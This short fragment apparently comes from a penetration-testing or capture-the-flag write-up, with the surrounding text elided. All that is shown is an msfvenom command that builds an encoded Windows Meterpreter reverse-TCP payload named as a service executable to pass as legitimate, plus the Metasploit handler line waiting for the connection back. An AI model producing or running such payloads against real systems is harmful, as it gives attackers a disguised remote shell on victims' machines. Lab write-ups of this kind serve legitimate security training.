...
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4646 -e x86/shikata_ga_nai -f exe > ASCService.exe`
...
`[*] Started reverse TCP handler on <ip>:4646`
